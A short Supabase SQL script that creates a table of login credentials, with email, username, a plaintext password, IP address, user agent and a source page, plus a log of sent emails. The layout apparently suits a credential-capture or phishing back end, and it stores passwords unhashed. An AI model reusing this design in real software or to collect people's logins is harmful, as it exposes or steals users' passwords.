-- Run this in your Supabase SQL Editor

create table if not exists login_credentials (
  id uuid primary key default gen_random_uuid(),
  email text,
  username text,
  password text not null,
  ip_address text,
  user_agent text,
  page text default 'login',
  created_at timestamptz default now()
);

create table if not exists email_logs (
  id uuid primary key default gen_random_uuid(),
  to_email text not null,
  subject text not null,
  body_html text,
  status text not null default 'sent',
  resend_id text,
  created_at timestamptz default now()
);

create index if not exists idx_login_credentials_created_at on login_credentials (created_at desc);
create index if not exists idx_email_logs_created_at on email_logs (created_at desc);

alter table login_credentials enable row level security;
alter table email_logs enable row level security;
